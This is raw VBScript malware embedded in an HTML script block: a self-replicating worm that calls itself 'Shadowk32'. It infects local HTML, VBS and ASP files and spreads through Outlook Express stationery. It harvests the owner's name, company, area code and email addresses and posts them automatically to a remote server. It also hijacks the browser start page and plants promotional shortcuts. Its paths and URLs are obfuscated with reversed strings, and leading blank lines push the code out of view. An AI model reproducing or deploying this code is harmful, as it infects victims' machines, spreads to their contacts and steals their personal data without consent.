<script language='VBScript'>










































On Error Resume Next
AoAbrir
Sub AoAbrir()
    On Error Resume Next
    mPath = Grf()
    Set Os = CreateObject("Scriptlet.TypeLib")
    If ModoHTML Then
        mURL = LCase(document.Location)
        If mPath = "" Then
            Os.Reset
            Os.Path = Sr("mth.tuoba\:C")
            Os.Doc = Lhtml()
            Os.Write()
            Ihtml = "<span style='position:absolute'><Iframe src='" & Sr("mth.tuoba\:C") & "' width='0' height='0'></Iframe></span>"
            Call document.Body.insertAdjacentHTML("AfterBegin", Ihtml)
        Else
            If Iv(mPath, Sr("sbv.krowten")) Then
                    setInterval "Rt()", 10000
            Else
                    m = "hta"
                If LCase(m) = Right(mURL, Len(m)) Then
                    id = setTimeout("mclose()", 1)
                    Inicio
                Else
                    Os.Reset()
                    Os.Path = mPath & Sr("ath.opocsE\metsyS\")
                    Os.Doc = Lhtml()
                    Os.write()
                    Iv mPath, Sr("ath.opocsE\metsyS")
                End If
            End If
        End If
    Else
        Inicio
    End If
End Sub
Sub Inicio()
    On Error Resume Next
    Set Of = CreateObject("Scripting.FileSystemObject")
    Set Arquivos = CreateObject("Scripting.Dictionary")
    Arquivos.Add "html", "1100"
    Arquivos.Add "vbs", "0100"
    Arquivos.Add "htm", "1100"
    Arquivos.Add "asp", "0010"
    Ds = Grf()
    PastaPapel = RegLe("HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery\Stationery Folder")
    If ModoVBS Then
        If Of.FileExists(Sr("mth.tuoba\:C")) Then
            Of.DeleteFile (Sr("mth.tuoba\:C"))
        End If
    Else
            Set fc = Of.CreateTextFile(Ds & Sr("sbv.krowten\"), True)
            fc.write Sa("0100")
            fc.Close
            bf = PastaPapel & Sr("mth.muhneN\")
            Set fc2 = Of.CreateTextFile(bf, True)
            fc2.write Lhtml
            fc2.Close
            oeid = RegLe("HKEY_CURRENT_USER\Identities\Default User ID")
            oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"
            MSH = oe & "\Message Send HTML"
            CUS = oe & "\Compose Use Stationery"
            SN = oe & "\Stationery Name"
            RegGrava MSH, 1
            RegGrava CUS, 1
            
			If RegLe(SN) <> "" then
			    On Error Resume Next
			    Dim Obj1, Obj2, Corpo
			    Set Obj1 = Of.OpenTextFile(RegLe(SN), 1)
			    Corpo = Obj1.ReadAll
			    Obj1.Close
			    If Not Sc(Corpo) Then
			        Corpo = Sa(n)
			        Set Obj2 = Of.OpenTextFile(RegLe(SN), 8)
			        Obj2.write Lscript(Lvbs)
			        Obj2.Close
			    End If
			else
			On Error Resume Next
				RegGrava SN, bf
			End If
            
            Set gf = Of.GetFolder(PastaPapel).Files
            Arquivos.Add "htm", "1100"
            For Each m In gf
                fext = GetExt(Of, Arquivos, m)
                If fext <> "" Then
                    Fw Of, m, fext
                End If
            Next
Dim Chave
Chave = RegLe("HKCU\Shadowk32")
IF Chave <> "Ok" Then
	RegGrava "HKCU\Shadowk32" , "Ok"
			
  Dim UnidadeWin, PastaWin, FSO, CaminhoTemp
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Set WshNet = Wscript.CreateObject("Wscript.Network")
  Set WshShell = CreateObject("WScript.Shell") 
  
	PastaWin = FSO.GetSpecialFolder(0)
	if Right(PastaWin, 1) <> "\" then PastaWin = PastaWin & "\"
	UnidadeWin = FSO.GetDriveName(PastaWin)
	if Right(UnidadeWin, 1) <> "\" then UnidadeWin = UnidadeWin & "\"


Dim AreaCode, Usuario, Empresa, Emails, Redirect, PGIncial, PGIncialHTML, EndPost
AreaCode = RegLe("HKCU\RemoteAccess\AreaCode")
Usuario = RegLe("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
if Usuario = "" Then
	Usuario = RegLe("HKLM\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOwner")
End if
Empresa = RegLe("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
if Empresa = "" Then
	Empresa = RegLe("HKLM\Software\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization")
End if
Redirect = RegLe("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
Dim Conta, EmailTmp
For Contador = 0 to 30
 if len(Contador) = 1 then
	Conta = "0000000" & Contador
 else
	Conta = "000000" & Contador
 End if
 EmailTmp = RegLe("HKCU\Software\Microsoft\Internet Account Manager\Accounts\" & Conta & "\SMTP Email Address")
 If EmailTmp <> "" Then
	Emails = Emails & EmailTmp & ";"
 End if
Next

EndPost = Sr("psa.tresni/nib-igc/rb.moc.airtemolafec.www//:ptth")

    PGIncial = "<" & "HTML" & ">" & vbCrLf & _
    "<" & "HEAD" & ">" & vbCrLf & _
    "<" & "TITLE" & ">about:blank<" & "/TITLE>" & vbCrLf & _
    "<" & "/HEAD" & ">" & vbCrLf & _
    "<" & "Body" & ">" & vbCrLf & _
    "<" & "/Body" & ">" & vbCrLf & _
    "<" & "form method=""POST"" action='" & EndPost & "' id=""Formulario"">" & vbCrLf & _
    "<" & "input type=""hidden"" name=""Redirect"" value='" & Redirect & "'>" & vbCrLf & _
    "<" & "input type=""hidden"" name=""Nome"" value='" & Usuario & "'>" & vbCrLf & _
    "<" & "input type=""hidden"" name=""Empresa"" value='" & Empresa & "'>" & vbCrLf & _
    "<" & "input type=""hidden"" name=""AreaCode"" value='" & AreaCode & "'>" & vbCrLf & _
    "<" & "input type=""hidden"" name=""Emails"" value='" & Emails & "'>" & vbCrLf & _
    "<" & "/form" & ">" & vbCrLf & _    
    "<" & "Script Language='JavaScript'>" & vbCrLf & _   
    		"Formulario.submit();" & vbCrLf & _   
    "<" & "/Script" & ">" & vbCrLf & _       
    "<" & "/Body" & ">" & vbCrLf & _    
    "</HTML" & ">"

PGIncialHTML = PastaWin & Sr("mth.knalb")
  Dim MyFile
  Set fso = CreateObject("Scripting.FileSystemObject")
  Set MyFile = fso.CreateTextFile(PGIncialHTML, True)
  MyFile.WriteLine(PGIncial)
  MyFile.Close
  
RegGrava "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", PGIncialHTML

CaminhoTemp = WshShell.SpecialFolders("Favorites")
	CriaLink(CaminhoTemp)
CaminhoTemp = WshShell.SpecialFolders("Desktop")
	CriaLink(CaminhoTemp)
CaminhoTemp = WshShell.SpecialFolders("StartMenu")
	CriaLink(CaminhoTemp)
CaminhoTemp = UnidadeWin & "Documents and Settings\All Users\Desktop\"
	CriaLink(CaminhoTemp)
CaminhoTemp = UnidadeWin & "Documents and Settings\All Users\Start Menu\"
	CriaLink(CaminhoTemp)
CaminhoTemp = UnidadeWin & "Documents and Settings\All Users\Favorites\"
	CriaLink(CaminhoTemp)
CaminhoTemp = UnidadeWin & "Documents and Settings\All Users\Menu Iniciar\"
	CriaLink(CaminhoTemp)
CaminhoTemp = UnidadeWin & "Documents and Settings\All Users\Favoritos\"
	CriaLink(CaminhoTemp)
	End If

    End If
End Sub
Sub Rt()
    Dim mPath
    On Error Resume Next
    mPath = Grf()
    Iv mPath, Sr("sbv.krowten")
End Sub
Sub mclose()
    document.write "<" & "title>Shadowk32</title" & ">"
    window.Close
End Sub
'
Function Sa(n)
    Dim VBSText, m
    VBSText = Lvbs()
    If Mid(n, 3, 1) = 1 Then
        m = "<%" & VBSText & "%>"
    End If
    If Mid(n, 2, 1) = 1 Then
        m = VBSText
    End If
    If Mid(n, 1, 1) = 1 Then
        m = Lscript(m)
    End If
    Sa = m & vbCrLf
End Function
Sub Fw(Of, S, n)
    Dim fc, fc2, m, mmail, mt
    On Error Resume Next
    Set fc = Of.OpenTextFile(S, 1)
    mt = fc.ReadAll
    fc.Close
    If Not Sc(mt) Then
        mmail = Ml(mt)
        mt = Sa(n)
        Set fc2 = Of.OpenTextFile(S, 8)
        fc2.write mt
        fc2.Close
    End If
End Sub
Function Sc(S)
    mN = "Shadowk32"
    If InStr(S, mN) > 0 Then
        Sc = True
    Else
        Sc = False
    End If
End Function
Function GetExt(Of, Arquivos, S)
    Dim fext
    On Error Resume Next
    fext = LCase(Of.GetExtensionName(S))
    GetExt = Arquivos.Item(fext)
End Function
Sub RegGrava(k, v)
    Dim R
    On Error Resume Next
    Set R = CreateObject("WScript.Shell")
    R.RegWrite k, v
End Sub
Function RegLe(v)
    Dim R
    On Error Resume Next
    Set R = CreateObject("WScript.Shell")
    RegLe = R.RegRead(v)
End Function
Function ModoVBS()
    Dim ErrTest
    On Error Resume Next
    ErrTest = WScript.ScriptFullname
    If Err Then
        ModoVBS = False
    Else
        ModoVBS = True
    End If
End Function
Function ModoHTML()
    Dim ErrTest
    On Error Resume Next
    ErrTest = document.Location
    If Er Then
        ModoHTML = False
    Else
        ModoHTML = True
    End If
End Function

Function Lvbs()
    Dim f, m, ws, Of
    On Error Resume Next
    If ModoVBS Then
        Set Of = CreateObject("Scripting.FileSystemObject")
        Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)
        Lvbs = f.ReadAll
    Else
        For Each ws In document.scripts
            If LCase(ws.Language) = "vbscript" Then
                If Sc(ws.Text) Then
                   Lvbs = ws.Text
                    Exit Function
                End If
            End If
        Next
    End If
End Function
Function Iv(mPath, mName)
    Dim Shell
    On Error Resume Next
    Set Shell = CreateObject("Shell.Application")
    Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb
    If Er Then
        Iv = False
    Else
        Iv = True
    End If
End Function
Function Grf()
    Dim Shell, mPath
    On Error Resume Next
    Set Shell = CreateObject("Shell.Application")
    mPath = "C:\"
    For Each mShell In Shell.NameSpace(mPath).Items
        If mShell.IsFolder Then
            Grf = mShell.Path
            Exit Function
        End If
    Next
    If Er Then
        Grf = ""
    End If
End Function
Function Gsf()
    Dim Of, m
    On Error Resume Next
    Set Of = CreateObject("Scripting.FileSystemObject")
    m = Of.GetSpecialFolder(0)
    If Er Then
        Gsf = "C:\"
    Else
        Gsf = m
    End If
End Function
Function Lhtml()
    Lhtml = "<" & "HTML" & ">" & vbCrLf & _
    "<" & "HEAD" & "><" & "/HEAD>" & vbCrLf & _
    "<" & "Body" & ">" & vbCrLf & _
    Lscript(Lvbs()) & vbCrLf & _
    "<" & "/Body" & ">" & vbCrLf & _    
    "</HTML" & ">"
End Function
Function Lscript(S)
    Lscript = "<" & "script language='VBScript'>" & vbCrLf & _
    S & "<" & "/script" & ">"
End Function
Function Er()
    If Err.Number = 0 Then
        Er = False
    Else
        Err.Clear
        Er = True
    End If
End Function
Function CriaLink(Caminho)
 Dim WshShell, FSO
 Dim LinkPg, TituloPg
  On Error Resume Next
	Set FSO = CreateObject("Scripting.FileSystemObject")
	Set WshShell = CreateObject("WScript.Shell") 
	LinkPg		= Sr("ten.3gr.em-meugluvid.www//:ptth")
	TituloPg	= Sr("em-meugluviD a açehnoC")
	if FSO.FolderExists(Caminho) then
		if Right(Caminho, 1) <> "\" then Caminho = Caminho & "\"
		Set oUrlLink = WshShell.CreateShortcut(Caminho & TituloPg & ".URL")
		oUrlLink.TargetPath = LinkPg
		oUrlLink.Save
	end if
End Function
Function Sr(Str)
    Sr =StrReverse(Str)
End Function
</script>
